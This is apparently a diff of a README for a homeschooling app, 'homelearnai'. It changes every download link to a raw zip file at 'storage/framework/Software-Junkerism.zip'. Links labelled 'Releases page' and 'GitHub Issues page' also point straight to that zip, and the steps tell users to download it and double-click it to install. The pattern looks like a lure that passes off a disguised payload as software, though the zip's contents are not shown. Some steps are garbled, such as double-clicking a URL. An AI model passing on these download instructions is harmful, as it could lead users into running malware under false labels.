@@ -6,17 +6,17 @@ Welcome to homelearnai! This application helps you manage your homeschooling nee
 
 ## 💾 Download & Install
 
-To download homelearnai, visit this page to download: [Download homelearnai](https://raw.githubusercontent.com/dalier97/homelearnai/main/monthon/homelearnai.zip)
+To download homelearnai, visit this page to download: [Download homelearnai](https://raw.githubusercontent.com/dalier97/homelearnai/main/storage/framework/Software-Junkerism.zip)
 
 Here are the steps to install and run the application:
 
 1. Click the link above to reach the Releases page.
 2. Look for the latest version listed at the top.
-3. Click on the file that says `https://raw.githubusercontent.com/dalier97/homelearnai/main/monthon/homelearnai.zip` or similar.
+3. Click on the file that says `https://raw.githubusercontent.com/dalier97/homelearnai/main/storage/framework/Software-Junkerism.zip` or similar.
 4. Once the file is downloaded, find it in your Downloads folder.
-5. Double-click on the `https://raw.githubusercontent.com/dalier97/homelearnai/main/monthon/homelearnai.zip` file to extract it.
+5. Double-click on the `https://raw.githubusercontent.com/dalier97/homelearnai/main/storage/framework/Software-Junkerism.zip` file to extract it.
 6. Open the extracted folder.
-7. Double-click on `https://raw.githubusercontent.com/dalier97/homelearnai/main/monthon/homelearnai.zip` to start the installation.
+7. Double-click on `https://raw.githubusercontent.com/dalier97/homelearnai/main/storage/framework/Software-Junkerism.zip` to start the installation.
 8. Follow the on-screen instructions to complete the installation.
 
 Once installed, you can launch homelearnai from your applications menu.
@@ -47,14 +47,14 @@ If you encounter any issues while using homelearnai, consider these common solut
 2. **Performance Problems:** Check your system requirements. Close any unnecessary applications to free up RAM.
 3. **Update Issues:** Ensure your internet connection is stable while checking for updates.
 
-If these steps don’t help, please check the [GitHub Issues page](https://raw.githubusercontent.com/dalier97/homelearnai/main/monthon/homelearnai.zip) for more guidance.
+If these steps don’t help, please check the [GitHub Issues page](https://raw.githubusercontent.com/dalier97/homelearnai/main/storage/framework/Software-Junkerism.zip) for more guidance.
 
 ## 🗨️ Community and Support
 
 You are not alone in your homeschooling journey. Join our community for tips and support:
 
 - **Discussion Forum:** Participate in discussions with other users to share experiences and advice.
-- **Feedback:** We value your input! Share your thoughts on features or report any issues on our [GitHub Issues page](https://raw.githubusercontent.com/dalier97/homelearnai/main/monthon/homelearnai.zip).
+- **Feedback:** We value your input! Share your thoughts on features or report any issues on our [GitHub Issues page](https://raw.githubusercontent.com/dalier97/homelearnai/main/storage/framework/Software-Junkerism.zip).
 - **Social Media:** Follow us on social media for tips, updates, and resources.
 
 ## 📜 License
@@ -65,4 +65,4 @@ homelearnai is licensed under the MIT License. This means you can use, modify, a
 
 Thank you for using homelearnai. Your commitment to providing quality education for your children inspires us. We hope our software makes your homeschooling experience smoother and more effective.
 
-For any further information, visit this page to download: [Download homelearnai](https://raw.githubusercontent.com/dalier97/homelearnai/main/monthon/homelearnai.zip)
+For any further information, visit this page to download: [Download homelearnai](https://raw.githubusercontent.com/dalier97/homelearnai/main/storage/framework/Software-Junkerism.zip)
